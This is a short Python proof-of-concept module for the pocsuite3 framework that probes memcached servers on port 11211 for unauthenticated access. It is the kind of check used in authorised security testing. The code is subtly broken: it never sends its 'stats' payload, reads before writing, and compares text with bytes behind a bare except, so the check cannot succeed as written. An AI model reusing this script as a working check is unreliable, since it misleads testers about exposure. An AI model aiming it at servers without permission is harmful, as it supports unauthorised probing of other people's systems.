#!/usr/bin/env python
#_*_ encoding：utf-8 _*_

import socket
from pocsuite3.api import POCBase
from pocsuite3.api import register_poc
from pocsuite3.api import Output

class Memcache(POCBase):
    vulID = '89692'
    version = '1.0'
    author = ['big04dream']
    vulDate = '2015-10-29'
    createDate = '2019-10-12'
    updateDate = '2019-10-12'
    references = ['https://www.seebug.org/vuldb/ssvid-89692']
    name = 'Memcached unauthorized access'
    appPowerLink = 'http://memcached.org/'
    appName = 'memcached'
    appVersion = 'all'
    vulType = 'Unauthorized access'
    desc = '''
    Memcached unauthorized access
    '''
    
    def _verify(self):
        result = {}
        try:
            ip = self.url.split('//')[1]
            port = 11211
            socket.setdefaulttimeout(5)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            payload = 'stats\r\n'
            recv = s.recv(1024)
            if 'STAT version' in recv:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['IP'] = ip
                result['VerifyInfo']['Payload'] = payload
            s.close()
        except:
            pass
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output

register_poc(Memcache)